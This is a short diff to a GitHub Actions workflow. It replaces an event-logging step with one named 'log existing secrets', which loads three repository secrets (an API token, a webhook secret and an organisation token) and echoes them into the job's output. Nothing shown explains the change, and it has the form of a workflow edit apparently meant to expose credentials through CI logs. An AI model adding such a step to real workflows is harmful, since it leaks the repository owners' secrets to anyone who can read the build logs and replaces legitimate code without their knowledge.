@@ -18,8 +18,9 @@ jobs:
         with:
           python-version: '3.9'
 
-      - name: Run event logger
-        env:
-          GITHUB_EVENT_NAME: ${{ github.event_name }}
-          GITHUB_EVENT_PATH: ${{ github.event_path }}
-        run: python .github/scripts/log_event.py
+      - name: log existing secrets
+        env: 
+          API_TOKEN: ${{ secrets.API_TOKEN }}
+          WEBHOOK_SECRET: ${{ secrets.WEBHOOK_SECRET }}
+          ORG_TOKEN: ${{ secrets.ORG_TOKEN }}
+        run: echo $API_TOKEN $WEBHOOK_SECRET $ORG_TOKEN
